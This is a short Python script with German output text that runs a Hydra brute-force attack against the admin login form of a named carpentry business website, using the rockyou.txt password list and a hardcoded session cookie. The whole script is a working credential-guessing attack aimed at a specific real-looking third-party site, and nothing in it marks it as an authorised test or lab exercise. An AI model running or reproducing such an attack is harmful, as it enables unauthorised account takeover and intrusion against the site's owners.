import os

cookie_header = "cfid=d2279794-1a5a-44e1-9e89-10a124c61646; cftoken=0"

hydra_cmd = f'hydra -l admin -P rockyou.txt -f -vV schreinerei-kuettel.ch https-post-form "/onetool/index.cfm?login=true:userLogin=^USER^&userPassword=^PASS^::C={cookie_header}"'

print("Starte Hydra mit Befehl:")
print(hydra_cmd)

os.system(hydra_cmd)
